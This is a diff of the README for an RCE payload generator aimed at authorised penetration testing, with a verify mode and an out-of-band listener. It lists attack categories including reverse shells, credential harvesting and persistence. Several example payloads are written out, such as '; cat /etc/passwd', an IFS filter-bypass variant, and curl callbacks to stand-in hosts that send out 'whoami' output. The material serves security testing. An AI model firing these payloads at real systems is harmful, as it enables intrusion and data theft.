@@ -1,355 +1,208 @@
-# RCEPayloadGen - Advanced RCE Payload Generator
+# RCEPayloadGen — RCE Testing Toolkit
 
-**Version 1.1.0** (semantic versioning; see `--version`).
+**Version 1.1.1** · MIT · Python 3.6+ · no third-party dependencies
 
-RCEPayloadGen is a comprehensive Remote Code Execution payload generator designed for penetration testers, security researchers, and red teamers. This tool generates a wide variety of RCE payloads tailored to different environments, contexts, encoding methods, and specific execution sinks.
+RCEPayloadGen is an offensive **RCE testing toolkit** for authorised penetration
+testing, red teaming, and security research. It covers the full loop, not just
+payload generation:
 
-## Features
+> **Generate** context-aware, sink-specific payloads → **deliver** them (or export
+> to Burp/Nuclei) → **verify** execution automatically against an authorised
+> target, including blind and out-of-band callbacks.
 
-- **Multi-Environment Support**: Generate payloads for Unix, Windows, Node.js, Python, PHP, Java, .NET, Ruby, Perl, Go, GraphQL, MongoDB/NoSQL, containerized Docker workloads, and Kubernetes clusters
-- **Context-Aware**: Break-out contexts (HTML, JS, SQL, shell-quoted strings) plus transport contexts (JSON, XML, YAML, HTTP header, GraphQL) that escape the payload to survive the wire format and reach the sink intact
-- **Sink-Specific Payloads**: Detailed granularity for code execution sinks, including OS commands, template engines (SSTI), and language-specific execution methods, emitted verbatim so each snippet stays syntactically valid for its sink
-- **Executable-Only Encoding**: The default encodings run as-is on the channel/sink or carry their own decoder (`base64_decode_exec`). Bare decoder-required blobs (Base64/Hex) are opt-in and warn on text output, and non-runnable transforms (ROT13, XOR/chunk shuffling, byte splicing) are removed — so operators never copy a payload that silently does nothing
-- **Modular Templates**: Payload bases are stored in editable JSON/YAML templates so teams can extend coverage without touching Python source code
-- **Customizable**: Fine-tune payload generation with various command-line options
-- **Built-in Verification Harness**: `--verify-url` fires the payloads at an authorised target and reports which actually executed, using each payload's oracle — closing the generate → deliver → confirm loop from one command
-- **Built-in OOB Listener**: `--listen` runs a lightweight HTTP+DNS listener that receives out-of-band callbacks and correlates each one back to the exact payload via its token — closing the blind/OOB loop without a separate interactsh/Collaborator
-- **Machine-Readable Success Signatures**: Every payload carries a `match` field — the reflected canary/OOB token, or an inferred command-output regex (`id` → `uid=\d+`, `/etc/passwd` → `root:...`) — so a verifier, Nuclei, or Burp macro can auto-confirm execution instead of eyeballing output
-- **Out-of-Band (OOB) Support**: Blind-RCE payloads that call back to your collaborator/interactsh domain, each stamped with a unique correlation token and recorded in a `token → payload` manifest so a received callback maps to exactly one payload
-- **Tooling Integrations**: Export directly as **Burp/ffuf** wordlists (grouped by injection context, plus a request template) or as runnable **Nuclei** templates with built-in OOB / time-based / reflection oracles
-- **Sink-Aware Target Profiles**: Describe the target once (environments, contexts, denied characters, max length, and sink shape — needs-separator / blind / decodes-input) and emit only payloads that could actually fire, instead of spraying everything
-- **WAF-Bypass Payloads**: Quote-free, space-free command-injection variants (`${IFS}`, brace expansion, `cat</etc/passwd`) for targets that reject quotes
-- **Detection-Friendly Mode**: Quickly produce benign canary payloads for safe scanning with `--detection-only`
-- **No Duplicates**: Intelligent duplicate detection to avoid redundant payloads
-- **Production-Ready**: Robust error handling, logging, and performance optimization
+## Highlights
 
-## Installation
+- **Targeted generation** — payloads tailored to the **environment** (Unix, Windows, Node.js, Python, PHP, Java, .NET, Ruby, Perl, Go, GraphQL, MongoDB/NoSQL, Docker, Kubernetes), the injection **context** (with container-aware escaping for JSON/XML/YAML/headers/shell-quoted strings), and the specific execution **sink** (OS commands, SSTI, SpEL/OGNL/Groovy, Mongo `$where`, …).
+- **Executable-only output** — every payload runs as-is on its channel/sink or carries its own decoder; non-runnable transforms are removed and decoder-required blobs are opt-in, so you never copy a payload that silently does nothing.
+- **Sink-aware target profiles** — describe the target once (denied characters, max length, needs-separator, blind, decodes-input) and emit only payloads that could actually fire.
+- **Auto-verification** — `--verify-url` fires payloads at an authorised target and reports which executed, using each payload's built-in oracle: a `match` regex, a reflected canary, or a timing delay.
+- **Built-in OOB listener** — `--listen` receives HTTP/DNS callbacks and correlates each back to the exact payload, closing the blind-RCE loop without a separate interactsh/Collaborator.
+- **Tooling integrations** — export as Burp/ffuf wordlists or runnable Nuclei templates with built-in OOB / time-based / reflection oracles.
+- **Safe by default** — a benign `--detection-only` canary mode, safety tiers, a consent gate, and audit logging.
+
+## Install
 
 ```bash
-# Clone the repository
 git clone https://github.com/kabiri-labs/rcpayloadgen.git
-cd rcpayloadgen
-
-# Install dependencies (none required beyond standard Python libraries)
-# Python 3.6+ required
+cd rcpayloadgen        # Python 3.6+, standard library only
 ```
 
-> **Note:** Generated payload files (`rce_payloads.txt`, `*.meta.jsonl`) and runtime
-> logs are not committed — they are listed in `.gitignore` and regenerated on demand.
+Generated payload files (`*.txt`, `*.meta.jsonl`, `*.map.jsonl`) and runtime logs
+are `.gitignore`d and regenerated on demand.
 
-## Testing
-
-The project ships a dependency-free `unittest` suite that locks in payload
-uniqueness, the executable-only encoding policy, safety filtering, and detection
-mode:
+## Quick Start
 
 ```bash
-python -m unittest discover -s tests
+# 1. Benign probes (no consent needed) — check whether your input reaches a sink
+python rce_payload_gen.py --detection-only --output detect.txt
+
+# 2. Generate targeted payloads for an authorised engagement
+python rce_payload_gen.py --acknowledge-consent \
+  --environments unix --categories basic_enum file_operations waf_bypass \
+  --output payloads.txt
+
+# 3. Fire them at an authorised target and auto-confirm what executed
+python rce_payload_gen.py --acknowledge-consent \
+  --environments unix --categories basic_enum file_operations waf_bypass \
+  --verify-url "https://target.example/lookup?host=FUZZ"
+
+# 4. Catch blind / out-of-band callbacks and map them back to payloads
+python rce_payload_gen.py --listen --correlate payloads.txt.map.jsonl
 ```
 
-## Usage
+Exploitation payloads require `--acknowledge-consent`; `--detection-only` is benign
+and does not. Only run any of this against systems you are authorised to test.
 
-```bash
-python rce_payload_gen.py [OPTIONS]
-```
-
-### Basic Examples
-
-Generate all payloads with default settings (requires exploitation consent acknowledgement):
-```bash
-python rce_payload_gen.py --acknowledge-consent
-```
-
-Generate only Unix reverse shells with base64 encoding:
-```bash
-python rce_payload_gen.py --categories reverse_shells --environments unix --encodings base64
-```
-
-Generate up to 1000 payloads for PHP contexts:
-```bash
-python rce_payload_gen.py --contexts php --max-payloads 1000 --acknowledge-consent
-```
-
-Generate benign payloads plus a metadata sidecar with indicators:
-```bash
-python rce_payload_gen.py --detection-only --include-metadata --output detection.txt
-```
-
-Blind-RCE payloads with per-payload OOB tokens (writes a `token → payload` map sidecar):
-```bash
-python rce_payload_gen.py --acknowledge-consent --categories oob \
-  --oob-domain your-id.oast.pro --output oob.txt
-```
-
-Export Burp/ffuf wordlists (grouped by context) or a runnable Nuclei pack:
-```bash
-python rce_payload_gen.py --acknowledge-consent --output-format burp --output run.txt
-python rce_payload_gen.py --detection-only --output-format nuclei --output run.txt
-```
-
-Use custom attacker IP and domain:
-```bash
-python rce_payload_gen.py --attacker-ip 10.0.0.1 --attacker-domain evil.com --acknowledge-consent
-```
-
-Run in safe detection mode with benign payloads:
-```bash
-python rce_payload_gen.py --detection-only
-```
-
-### Full Options
+## Options
 
 | Option | Description | Default |
 |--------|-------------|---------|
-| `-o, --output` | Output file path | `rce_payloads.txt` |
-| `--attacker-ip` | Attacker IP for reverse shells | `192.168.1.100` |
-| `--attacker-domain` | Attacker domain for download payloads | `attacker.com` |
-| `--max-payloads` | Maximum number of payloads to generate | Unlimited |
-| `--contexts` | Contexts to generate (space-separated) | Default language/structural contexts |
-| `--categories` | Categories to generate (space-separated) | All categories |
-| `--encodings` | Encoding methods to apply (space-separated) | All encodings |
-| `--environments` | Environments to generate (space-separated) | All environments |
-| `--template-file` | Path to a JSON/YAML template bundle | `templates/payloads.json` |
-| `--detection-only` | Generate benign payloads for validation scans | Disabled |
-| `--output-format` | `text`, `jsonl`, `burp` (per-context wordlists + request template), or `nuclei` (runnable templates) | `text` |
-| `--oob-domain` | Collaborator/interactsh domain for out-of-band payloads; each gets a unique subdomain token | None |
-| `--verify-url` | Authorised target URL with a `FUZZ` marker; fire payloads and confirm execution via their oracle | None |
-| `--verify-data` / `--verify-header` / `--verify-method` | Request body (with `FUZZ`) / repeatable header / HTTP method for verification | — |
-| `--verify-delay` / `--verify-timeout` | Seconds between requests / per-request timeout for verification | `0` / `8` |
-| `--listen` | Run the built-in OOB listener (HTTP+DNS) that correlates callbacks to payload tokens | Off |
-| `--correlate` | A `.map.jsonl` manifest to map received tokens back to payloads | None |
-| `--listen-http-port` / `--listen-dns-port` | Listener HTTP port / UDP DNS port | `8080` / `5335` |
-| `--listen-answer-ip` / `--listen-log` | IP returned by DNS answers / file to append hits as JSONL | `127.0.0.1` / None |
-| `--include-metadata` | Emit indicators, safety tiers, and notes | Disabled |
-| `--max-safety` | Highest safety tier to include (`safe`, `intrusive`, `stateful`) | `safe` in detection, `intrusive` otherwise |
-| `--include-blocking` | Include blocking or timing-based probes | Disabled |
-| `--acknowledge-consent` | Required confirmation before creating exploitation payloads | Disabled |
-| `--watermark` | Embed a traceable watermark token into each exploitation payload (audit logging happens regardless) | Disabled |
-| `--target-profile` | JSON profile describing the target; supplies defaults that CLI flags override | None |
-| `--deny-chars` | Drop payloads containing any of these characters (e.g. quotes) | None |
-| `--max-length` | Drop payloads longer than this many characters | None |
-| `--sink-needs-separator` | Sink concatenates input mid shell command: keep only separator-led payloads | Off |
-| `--sink-blind` | Sink returns no output: keep only out-of-band confirmable payloads (timing/OOB) | Off |
-| `--sink-decodes` | Encodings the sink decodes before use (e.g. `base64`); those variants become valid and are generated | None |
+| `-o, --output` | Output file (or base directory for `burp`/`nuclei`) | `rce_payloads.txt` |
+| `--environments` | Environments to generate | All |
+| `--categories` | Categories to generate | All |
+| `--contexts` | Injection contexts to generate | Default (language/structural) set |
+| `--encodings` | Encodings to apply | Default (self-contained) set |
+| `--output-format` | `text`, `jsonl`, `burp`, or `nuclei` | `text` |
+| `--max-payloads` | Cap the number of payloads | Unlimited |
+| `--attacker-ip` / `--attacker-domain` | Substituted into reverse-shell / download payloads | `192.168.1.100` / `attacker.com` |
+| `--template-file` | Custom JSON/YAML payload templates | `templates/payloads.json` |
+| `--detection-only` | Benign canary/timing probes for safe validation | Off |
+| `--include-metadata` | Write a `.meta.jsonl` sidecar (indicators, safety tiers, notes) | Off |
+| `--max-safety` | Highest safety tier: `safe`, `intrusive`, `stateful` | `safe` (detection) / `intrusive` |
+| `--include-blocking` | Include blocking/timing probes | Off |
+| `--acknowledge-consent` | Required to generate/fire exploitation payloads | Off |
+| `--watermark` | Embed a traceable token in each payload (audit logging happens regardless) | Off |
+| **Out-of-band** | | |
+| `--oob-domain` | Collaborator/interactsh domain; each payload gets a unique subdomain token | None |
+| `--verify-url` | Authorised target URL with a `FUZZ` marker; fire and confirm execution | None |
+| `--verify-data` / `--verify-header` / `--verify-method` | Body (with `FUZZ`) / repeatable header / HTTP method | — |
+| `--verify-delay` / `--verify-timeout` | Seconds between requests / per-request timeout | `0` / `8` |
+| `--listen` + `--correlate <map.jsonl>` | Run the OOB listener and map callbacks to payloads | Off |
+| `--listen-http-port` / `--listen-dns-port` / `--listen-answer-ip` / `--listen-log` | Listener HTTP/DNS ports, DNS answer IP, hit log | `8080` / `5335` / `127.0.0.1` / — |
+| **Targeting** | | |
+| `--target-profile` | JSON profile of the target (supplies defaults CLI flags override) | None |
+| `--deny-chars` / `--max-length` | Drop payloads containing these chars / longer than this | None |
+| `--sink-needs-separator` | Sink concatenates input mid shell command → keep only separator-led payloads | Off |
+| `--sink-blind` | Sink returns no output → keep only OOB/timing-confirmable payloads | Off |
+| `--sink-decodes` | Encodings the sink decodes (e.g. `base64`) → those variants become valid | None |
 
-### Available Contexts
+## Environments, Categories, Contexts, Encodings
 
-A context is more than a prefix/suffix: each one also carries an **escape rule**
-that makes the payload valid *inside* its surrounding container (e.g. a payload
-placed in a JSON string has its quotes and backslashes escaped so it survives the
-wire format and reaches the sink intact). Contexts fall into two families.
+<details>
+<summary><b>Environments</b></summary>
 
-**Language & structural break-outs** (the default set when `--contexts` is omitted):
+`unix`, `windows`, `nodejs`, `python`, `php`, `java`, `dotnet`, `ruby`, `perl`,
+`go`, `docker`, `kubernetes`, `graphql` (introspection / argument injection /
+batching), `mongodb` (operator injection / `$where` / `$function`).
+</details>
 
-- `raw` - No wrapper; language-native snippets and direct command probes
-- `html` - HTML text context
-- `attribute` - Quoted HTML attribute break-out
-- `attribute_unquoted` - Unquoted HTML attribute break-out
-- `javascript` - JavaScript string break-out
-- `sql` - SQL string break-out
-- `php` - PHP code context
-- `unix_shell` / `windows_cmd` / `powershell` - shell contexts
-- `shell_single_quoted` / `shell_double_quoted` - break out of a single/double-quoted shell argument (opt-in)
-- `graphql_string` - inject into an inline GraphQL string literal (opt-in)
+<details>
+<summary><b>Categories</b></summary>
 
-**Transport / serialization contexts** (opt-in via `--contexts`; carry *any*
-environment's payload and escape it for the wire format):
+| Category | Purpose |
+|----------|---------|
+| `basic_enum` | Identity / host / process / OS enumeration |
+| `file_operations` | File access and sensitive-file reads |
+| `network_operations` | Network configuration and discovery |
+| `code_execution` | Language-specific execution, at sink-level granularity |
+| `download_execute` | Download-and-run payloads |
+| `reverse_shells` | Reverse shells across environments |
+| `credential_access` | Credential, token, and secret harvesting |
+| `privilege_escalation` | sudo / service / platform priv-esc checks |
+| `persistence` | Common persistence tradecraft (lab only) |
+| `cloud_metadata` | Cloud instance-metadata harvesting |
+| `database_enumeration` | SQL/NoSQL discovery and schema inspection |
+| `lateral_movement` | SSH / WinRM / PsExec expansion checks |
+| `container_escape` | Docker / Kubernetes hardening checks |
+| `waf_bypass` | Quote-free / space-free command injection (`${IFS}`, `{cat,/etc/passwd}`) |
+| `oob` | Out-of-band DNS/HTTP callbacks and JNDI/Log4Shell (needs `--oob-domain`) |
+| `nosql_injection` | Mongo operator injection, `$where` server-side JS, blind timing |
+| `graphql_injection` | GraphQL introspection, resolver-argument injection, batching |
+</details>
 
-- `json` - JSON string value (quotes/backslashes/controls escaped)
-- `graphql_variable` - GraphQL variables JSON
-- `xml` - XML text/attribute (entity-escaped)
-- `xml_cdata` - XML CDATA section
-- `yaml` - YAML double-quoted scalar
-- `http_header` - HTTP header value (CR/LF neutralised)
+<details>
+<summary><b>Contexts</b> — each carries an escape rule so the payload survives its container</summary>
 
-Example — deliver a command-injection payload inside a JSON API field:
-```bash
-python rce_payload_gen.py --acknowledge-consent --contexts json --environments unix
-```
+**Language / structural break-outs** (default set): `raw`, `html`, `attribute`,
+`attribute_unquoted`, `javascript`, `sql`, `php`, `unix_shell`, `windows_cmd`,
+`powershell`, `shell_single_quoted`, `shell_double_quoted`, `graphql_string`.
 
-### Available Categories
+**Transport / serialization** (opt-in via `--contexts`; carry *any* environment's
+payload and escape it for the wire): `json`, `graphql_variable`, `xml`,
+`xml_cdata`, `yaml`, `http_header`.
 
-- `basic_enum` - Basic enumeration commands
-- `file_operations` - File system operations
-- `network_operations` - Network reconnaissance
-- `code_execution` - Language-specific code execution (with sink-level granularity)
-- `download_execute` - Download and execute payloads
-- `reverse_shells` - Reverse shell payloads
-- `credential_access` - Credential discovery and secret harvesting primitives
-- `privilege_escalation` - Local privilege escalation checks across OS and container targets
-- `persistence` - Payloads that create or simulate common persistence mechanisms
-- `cloud_metadata` - Cloud service metadata harvesting from on-prem or containerised footholds
-- `database_enumeration` - Database discovery and schema inspection helpers
-- `lateral_movement` - Post-exploitation lateral movement primitives
-- `waf_bypass` - Quote-free / space-free command-injection variants for filtered inputs
-- `oob` - Out-of-band callback payloads (requires `--oob-domain`), including DNS/HTTP exfil and JNDI/Log4Shell
-- `nosql_injection` - MongoDB/NoSQL operator injection, `$where` server-side JS, and blind time-based probes
-- `graphql_injection` - GraphQL introspection, resolver-argument injection (OS/SQL/NoSQL/traversal), and batching
+A payload placed in a `json` string has its quotes/backslashes escaped; in `xml`
+it is entity-escaped; in `shell_single_quoted` it breaks out of the quotes — so
+it stays valid inside the container and reaches the sink intact.
+</details>
 
-### Available Environments
+<details>
+<summary><b>Encodings</b> — default set is always directly usable; blobs are opt-in</summary>
 
-- `unix` - Unix-like systems
-- `windows` - Windows systems
-- `nodejs` - Node.js environment
-- `python` - Python environment
-- `php` - PHP environment
-- `java` - Java/JVM environment
-- `dotnet` - .NET environment
-- `ruby` - Ruby environment
-- `perl` - Perl environment
-- `go` - Go environment
-- `docker` - Container escape research against Docker runtimes
-- `kubernetes` - Payloads targeting Kubernetes workloads and control planes
-- `graphql` - GraphQL injection surface (introspection, argument-borne injection, batching)
-- `mongodb` - MongoDB / NoSQL injection surface (operator injection, `$where`/`$function` server-side JS)
+**Default (self-contained):** `none`, `url_encode`, `double_url_encode`,
+`random_case` (case-insensitive runners only), and `base64_decode_exec`
+(carries its own `base64 -d|sh` decoder; shell runners only).
 
-### Available Encoding Methods
+**Decoder-required (opt-in via `--encodings`):** `base64`, `hex`,
+`base64_then_url`, `double_base64`. These are bare blobs that only execute where
+the *sink itself* decodes the input; requesting them for text output without
+`--include-metadata` prints a warning. Use `--sink-decodes base64` to mark them
+valid for a known-decoding sink.
 
-Encodings fall into two groups. **Default encodings** run as-is on the receiving
-channel/sink (or carry their own decoder), so plain-text output is always
-directly usable:
+Non-runnable transforms (ROT13, XOR/chunk shuffling, byte splicing) were removed.
+</details>
 
-- `none` - No encoding
-- `url_encode` - URL encoding (for channels that URL-decode before the sink)
-- `double_url_encode` - Double URL encoding
-- `random_case` - Random case variation, emitted **only** for case-insensitive runners (Windows `cmd`, PowerShell, SQL); suppressed elsewhere because it would corrupt the command
-- `base64_decode_exec` - **Self-contained** base64 that carries its own decoder pipeline (`echo <b64>|base64 -d|sh`); runs as-is on a POSIX shell (shell runners only)
+<details>
+<summary><b>Code-execution sinks</b> (for <code>--categories code_execution</code>)</summary>
 
-**Decoder-required encodings** are opt-in via `--encodings`. They emit bare blobs
-that only execute where the *sink itself* base64/hex-decodes the input (e.g.
-`eval(base64_decode(...))`). Because a plain-text blob can look like a working
-payload but do nothing on its own, they are excluded from the default set and,
-when requested for text output without `--include-metadata`, the tool prints a
-warning:
+- **nodejs** — `child_process_exec`, `pug_ssti`, `ejs_ssti`, `handlebars_ssti`, `vm_eval`, `deserialization`
+- **python** — `os_system`, `subprocess`, `jinja2_ssti`
+- **php** — `exec_system`, `eval`, `deserialize`
+- **java** — `runtime_exec`, `freemarker_ssti`, `velocity_ssti`, `thymeleaf_ssti`, `spel`, `ognl`, `groovy`, `deserialization`, `expression`
+- **dotnet** — `process_start`, `deserialize`
+- **ruby** — `kernel_system`, `erb_ssti`
+- **perl** — `system_backticks`
+- **go** — `os_exec`
+- **mongodb** (`nosql_injection`) — `operator_injection`, `where_js`, `server_side_js`
+- **graphql** (`graphql_injection`) — `introspection`, `injection`, `batching`
 
-- `base64` - Bare base64 blob
-- `hex` - Bare hexadecimal blob
-- `base64_then_url` - Base64 then URL encoding
-- `double_base64` - Nested base64 layers
-
-> **Removed in an earlier version:** `rot13`, `rot13_then_base64`, `insert_special_chars`,
-> `xor_polymorphic`, and `chunk_shuffle`. These produced non-executable output
-> (e.g. `rot13("id") -> "vq"`, or literal `XOR(..):` / `shuffle::` debug strings)
-> and only inflated the result set with payloads that fail on the target.
-
-> **Removed in this version:** `rot13`, `rot13_then_base64`, `insert_special_chars`,
-> `xor_polymorphic`, and `chunk_shuffle`. These produced non-executable output
-> (e.g. `rot13("id") -> "vq"`, or literal `XOR(..):` / `shuffle::` debug strings)
-> and only inflated the result set with payloads that fail on the target.
-
-## Payload Types
-
-RCEPayloadGen generates payloads across multiple categories:
-
-1. **Basic Enumeration**: Common system reconnaissance commands
-2. **File Operations**: File system interaction and sensitive file access
-3. **Network Operations**: Network configuration and discovery
-4. **Code Execution**: Language-specific code execution patterns with sink-level details
-5. **Download & Execute**: Payloads that download and execute remote code
-6. **Reverse Shells**: Comprehensive reverse shell payloads for various environments
-7. **Credential Access**: Systematic harvesting of credentials, tokens, and configuration secrets
-8. **Privilege Escalation**: Coverage for sudo, service, and platform-specific privilege escalation reconnaissance
-9. **Persistence**: Command patterns that emulate real-world persistence tradecraft on Unix and Windows hosts
-10. **Cloud Metadata Discovery**: Probing public cloud instance metadata services from multiple vantage points
-11. **Database Enumeration**: Enumerate SQL/NoSQL backends and dump useful schema information
-12. **Lateral Movement**: Validate remote management channels (SSH, WinRM, PsExec, etc.) for expansion
-13. **Container Escape Research**: Docker and Kubernetes oriented payloads to validate hardening of container platforms
-
-## Detailed Code Execution Sinks
-
-For the `code_execution` category, payloads are generated at a sink-specific level and emitted verbatim, so each snippet stays syntactically valid for its target sink (encoding variants are applied separately and labelled in metadata). Below is a list of supported sinks per environment:
-
-### Node.js (`nodejs`)
-- `child_process_exec`: Executions using child_process module
-- `pug_ssti`: Pug template engine SSTI
-- `ejs_ssti`: EJS template engine SSTI
-- `handlebars_ssti`: Handlebars template engine SSTI
-
-### Python (`python`)
-- `os_system`: os.system executions
-- `subprocess`: subprocess module executions
-- `jinja2_ssti`: Jinja2 template engine SSTI
-
-### PHP (`php`)
-- `exec_system`: system/exec/shell_exec/passthru/eval/preg_replace executions
-
-### Java (`java`)
-- `runtime_exec`: Runtime.exec and ProcessBuilder
-- `freemarker_ssti`: Freemarker template engine SSTI
-- `velocity_ssti`: Velocity template engine SSTI
-- `thymeleaf_ssti`: Thymeleaf template engine SSTI
-- `spel`: Spring Expression Language (SpEL) injection
-- `ognl`: OGNL injection (e.g. Struts)
-- `groovy`: Groovy expression / dynamic class-loading execution
-
-### .NET (`dotnet`)
-- `process_start`: Process.Start executions
-
-### Ruby (`ruby`)
-- `kernel_system`: system/backticks/exec executions
-- `erb_ssti`: ERB template engine SSTI
-
-### Perl (`perl`)
-- `system_backticks`: system/backticks/exec executions
-
-### Go (`go`)
-- `os_exec`: exec.Command executions
-
-### MongoDB (`mongodb`, category `nosql_injection`)
-- `operator_injection`: query-operator / auth-bypass injection (`$ne`, `$gt`, `$regex`, `$or`)
-- `where_js`: `$where` server-side JavaScript (including blind `sleep()` timing)
-- `server_side_js`: `$function` / `$accumulator` server-side JS execution (MongoDB 4.4+)
-
-### GraphQL (`graphql`, category `graphql_injection`)
-- `introspection`: schema discovery queries
-- `injection`: resolver-argument injection reaching OS command / SQL / NoSQL / path-traversal sinks
-- `batching`: aliasing brute-force and nested-query amplification
+Payloads are emitted verbatim so each snippet stays syntactically valid for its
+sink; encoding variants are applied separately and labelled in metadata.
+</details>
 
 ## Target Profiles
 
-Instead of spraying every payload, describe the target once and let the generator
-emit only what could actually reach the sink. A profile is a small JSON file:
+Describe the target once and generate only what could reach the sink. A profile
+is a small JSON file (fields supply defaults; explicit CLI flags override them):
 
 ```json
 {
-  "name": "quote-filtered-unix",
+  "name": "shell-concat-noquotes",
   "environments": ["unix"],
   "contexts": ["raw"],
   "categories": ["basic_enum", "file_operations", "waf_bypass", "oob"],
-  "encodings": ["none", "url_encode"],
+  "encodings": ["none"],
   "deny_chars": ["'", "\""],
-  "max_length": 256,
+  "sink_needs_separator": true,
   "oob_domain": "your-id.oast.pro"
 }
 ```
 
 ```bash
-python rce_payload_gen.py --acknowledge-consent --target-profile profiles/quote-filtered-unix.json
+python rce_payload_gen.py --acknowledge-consent --target-profile profiles/shell-concat-noquotes.json
 ```
 
-Profile fields supply defaults; any explicit CLI flag overrides the matching
-field. `deny_chars` and `max_length` (also available directly as `--deny-chars`
-/ `--max-length`) filter the **final** payload — so a URL-encoded quote survives
-a quote filter, because the literal character is gone.
+- `deny_chars` / `max_length` filter the **final** payload — a URL-encoded quote survives a quote filter because the literal character is gone.
+- **Sink shape** narrows generation to what can actually fire: `sink_needs_separator` (mid-command injection → separator-led break-outs only), `sink_blind` (no output → OOB/timing only), `sink_decodes` (input is decoded → those encodings become valid). Against a mid-command sink, `sink_needs_separator` dropped ~20% of payloads *without losing a single confirmed hit*.
 
-**Sink-shape awareness** narrows generation to what the sink could actually
-execute, cutting payloads that can never fire (in testing, `sink_needs_separator`
-dropped ~20% of payloads against a mid-command sink *without losing a single
-confirmed hit*):
-
-- `sink_needs_separator` (`--sink-needs-separator`) — input lands mid shell command, so only separator-led break-out payloads are kept
-- `sink_blind` (`--sink-blind`) — the sink returns no output, so only out-of-band confirmable payloads (timing / OOB) are kept
-- `sink_decodes` (`--sink-decodes base64 ...`) — the sink decodes the input, so those encoded forms become valid and are generated (and no longer warned about)
-
-Example profiles ship in [`profiles/`](profiles/) (`quote-filtered-unix.json`,
-`shell-concat-noquotes.json`).
+Example profiles ship in [`profiles/`](profiles/).
 
 ## Verifying Against a Target
 
-`--verify-url` closes the loop: it fires the generated payloads at an
-**authorised** target and reports which ones actually executed, using each
-payload's built-in oracle (the `match` regex, a reflected canary token, or a
-timing delay). Put a `FUZZ` marker where the payload should go.
+`--verify-url` fires the payloads at an **authorised** target and reports which
+executed, using each payload's oracle. Put a `FUZZ` marker where the payload goes
+(also works in `--verify-data` and `--verify-header`; method defaults to GET, or
+POST with `--verify-data`).
 
 ```bash
 python rce_payload_gen.py --acknowledge-consent \
@@ -358,90 +211,67 @@ python rce_payload_gen.py --acknowledge-consent \
 ```
 
 ```
-[verify] GET https://target.example/lookup?host=FUZZ  (authorised target)
 [verify] sent 270 unique payloads: confirmed=44, no-match=86, no-signature=140
 
 [verify] CONFIRMED execution (44):
   [file_operations/raw] ; cat /etc/passwd            (matched /root:.*?:0:0:/)
   [waf_bypass/raw]      ; cat${IFS}/etc/passwd        (matched /root:.*?:0:0:/)
-  ...
 ```
 
-- The `FUZZ` marker also works in `--verify-data` (request body) and repeatable
-  `--verify-header` values; method defaults to GET (POST when `--verify-data` is set).
-- Rate-limit with `--verify-delay <seconds>` and cap with `--max-payloads`.
-- OOB payloads are sent but confirmed out-of-band — watch your listener for their tokens.
-- Requires `--acknowledge-consent`; every run is written to `exploit_audit.log`.
-  **Only run this against systems you are authorised to test.**
+Rate-limit with `--verify-delay` and cap with `--max-payloads`. OOB payloads are
+sent but confirmed out-of-band (see below). Requires `--acknowledge-consent`;
+every run is audited to `exploit_audit.log`.
 
 ## Out-of-Band Listener
 
-`--listen` runs a built-in listener that receives OOB callbacks and correlates
-each one to the payload that produced it (via the token in a `.map.jsonl`
-manifest) — closing the loop for blind RCE without a separate interactsh.
+`--listen` receives OOB callbacks and correlates each to the payload that produced
+it, via the token in a `.map.jsonl` manifest — no separate interactsh required.
 
 ```bash
-# 1) generate OOB payloads (writes oob.txt + oob.txt.map.jsonl)
+# generate OOB payloads (writes oob.txt + oob.txt.map.jsonl), then listen
 python rce_payload_gen.py --acknowledge-consent --categories oob \
   --oob-domain your-id.oob.example.com --output oob.txt
-
-# 2) run the listener, correlating callbacks to those payloads
 python rce_payload_gen.py --listen --correlate oob.txt.map.jsonl \
   --listen-http-port 8080 --listen-dns-port 53
 ```
 
 ```
-[listen] OOB listener up — HTTP :8080, DNS :53
 [HIT] http token=8k2hn1ufohpv from 10.0.0.5 -> ; curl http://8k2hn1ufohpv.oob.example.com/ [oob/raw]
 ```
 
-- Correlates by token in the callback host **or** path (so DNS/HTTP exfil like `curl http://token.dom/$(whoami)` still maps back).
-- `--listen-answer-ip` sets the IP returned in DNS answers; `--listen-log` appends hits as JSONL.
-- For real engagements, point the OOB domain's NS/A records at this host (port 53 needs root); for lab use, aim payloads straight at the listener's host/port.
+Correlates by token in the callback host **or** path (so exfil like
+`curl http://token.dom/$(whoami)` still maps). For real engagements point the OOB
+domain's NS/A records here (port 53 needs root); for lab use aim payloads straight
+at the listener.
 
 ## Output Formats & Integrations
 
-- **`text` / `jsonl`** — a single file of payloads (or JSONL records). A `<output>.map.jsonl` manifest is written for every payload that has an oracle — a correlation `token` (OOB / detection canary) **or** a machine-readable `match` regex — mapping it to its exact payload, context, and expected channel, so a received callback, reflected canary, or command-output signature is traceable to one payload and can be auto-confirmed by a verifier.
-- **`burp`** — writes a `<output>_burp/` directory with deduplicated, watermark-free wordlists split per injection context (`payloads-raw.txt`, `payloads-sql.txt`, …), a combined `payloads-all.txt`, and a `request.txt` template with a marked injection point. Load the lists into Burp Intruder, or `ffuf -request request.txt -w payloads-all.txt:FUZZ`.
-- **`nuclei`** — writes a `<output>_nuclei/` directory of runnable Nuclei templates grouped by environment and **oracle**:
-  - *OOB* templates inject callbacks and match on `interactsh_protocol` (the real host is rewritten to `{{interactsh-url}}`).
-  - *Time-based* templates normalise every delay to 6s and match on `duration>=6`.
-  - *Reflection* templates inject a fixed canary and match it in the response body.
-  - For the fullest pack, run `--detection-only --output-format nuclei` (reflection + time + OOB).
+- **`text` / `jsonl`** — payloads (or full JSONL records). A `<output>.map.jsonl` manifest is written for every payload that has an oracle — a correlation `token` or a machine-readable `match` regex — so a callback, reflected canary, or command-output signature is traceable to one payload and auto-confirmable.
+- **`burp`** — a `<output>_burp/` directory of deduplicated, watermark-free wordlists split per context, a combined `payloads-all.txt`, and a `request.txt` template. Load into Burp Intruder or `ffuf -request request.txt -w payloads-all.txt:FUZZ`.
+- **`nuclei`** — a `<output>_nuclei/` directory of runnable templates grouped by environment and oracle: OOB (`interactsh_protocol`), time-based (`duration>=6`), and reflection (canary in body). For the fullest pack, run `--detection-only --output-format nuclei`.
 
-## Logging & Ethical Controls
+## Safety & Ethics
 
-- Detailed execution logs are stored in `rce_generator.log` with timestamps and severity levels for monitoring.
-- Exploitation runs always write an audit entry to `exploit_audit.log` with a unique token, regardless of whether the watermark is embedded.
-- Detection mode produces safe canary payloads suitable for authorized scanning and validation activities.
-- When `--include-metadata` is enabled, plain-text output keeps raw payloads in the main file and writes a `.meta.jsonl` sidecar with the expected indicator, runner, safety tier, and lint notes for each payload.
-- The in-payload watermark is **opt-in** via `--watermark`, so the default exploitation output stays clean and copy-pasteable. When enabled, payloads carry an embedded comment/command referencing the audit token to discourage misuse.
